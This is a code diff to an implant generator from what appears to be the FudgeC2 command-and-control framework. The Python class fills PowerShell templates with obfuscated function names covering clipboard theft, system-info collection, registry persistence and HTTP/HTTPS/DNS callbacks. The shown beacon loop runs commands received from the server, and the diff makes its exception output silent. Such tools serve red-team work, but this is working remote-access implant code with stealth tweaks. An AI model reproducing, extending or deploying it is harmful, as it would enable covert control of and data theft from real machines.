@@ -4,27 +4,29 @@ import random
 
 from Implant.PSObfucate import PSObfucate
 
+
 class ImplantGenerator:
     # ImplantGenerator has a single public method (generate_implant_from_template)
     #   which is used to generate a new active implant in the event of a stager
     #   calling back. Configuration from the implant template is used to determine
     #   which functionality should be embedded within the active implant.
 
-    JinjaRandomisedArgs = {"rnd_function": "aaaaaa",
-                           "obf_remote_play_audio": "RemotePlayAudio",
-                           "obf_sleep": "sleep",
-                           "obf_select_protocol": "select_protocol",
-                           "obf_collect_sysinfo": "collect-sysinfo",
-                           "obf_http_conn": "http-connection",
-                           "obf_https_conn": "https-connection",
-                           "obf_dns_conn": "dns-connection",
-                           "obf_create_persistence": "create-persistence",
-                           "obf_builtin_command": "execute-command",
-                           "obf_reg_key_name": "FudgeC2Persistence",
-                           "obf_callback_url":"url",
-                           "obf_callback_reason":"callback_reason",
-                           "obf_get_clipboard":"export-clipboard"
-                           }
+    JinjaRandomisedArgs = {
+        "rnd_function": "aaaaaa",
+        "obf_remote_play_audio": "RemotePlayAudio",
+        "obf_sleep": "sleep",
+        "obf_select_protocol": "select_protocol",
+        "obf_collect_sysinfo": "collect-sysinfo",
+        "obf_http_conn": "http-connection",
+        "obf_https_conn": "https-connection",
+        "obf_dns_conn": "dns-connection",
+        "obf_create_persistence": "create-persistence",
+        "obf_builtin_command": "execute-command",
+        "obf_reg_key_name": "FudgeC2Persistence",
+        "obf_callback_url": "url",
+        "obf_callback_reason": "callback_reason",
+        "obf_get_clipboard": "export-clipboard"
+        }
 
     # -- This is to be finished with PoC WorkWork audio
     play_audio = '''
@@ -43,7 +45,6 @@ function {{ ron.obf_get_clipboard }}() {
 }
 '''
 
-    # -- KEEP
     fde_func_b = '''
 function {{ ron.obf_collect_sysinfo }}(){
     $h = hostname
@@ -54,7 +55,6 @@ function {{ ron.obf_collect_sysinfo }}(){
 }
 '''
 
-    # -- OPTIONAL REMOVEAL
     random_function = '''
 function {{ ron.rnd_function }} () {}
 '''
@@ -161,7 +161,7 @@ function {{ ron.obf_https_conn }}(${{ ron.obf_callback_reason }}){
 }    
 '''
 
-    select_protocol='''
+    select_protocol = '''
 function {{ ron.obf_select_protocol }}($b){
     sleep (Get-Random -Minimum (${{ ron.obf_sleep }} *0.90) -Maximum (${{ ron.obf_sleep }} *1.10))
     return get-random($b)
@@ -183,9 +183,9 @@ while($true){
     try {
             {{ proto_core }}
     } catch {
-        $_.Exception | format-list -Force
+        $_.Exception | format-list -Force | Out-Null
     }
-    if ( $headers -NotLike "=="){
+    if (($headers -NotLike "==") -And ($headers -ne $null)){
         {{ ron.obf_builtin_command }}($headers)
         
         if ($tr -ne "0"){ 
@@ -194,7 +194,7 @@ while($true){
             try {
                     {{ proto_core }}
             } catch {
-                $_.Exception | format-list -Force
+                $_.Exception | format-list -Force | Out-Null
             }
         }       
     }
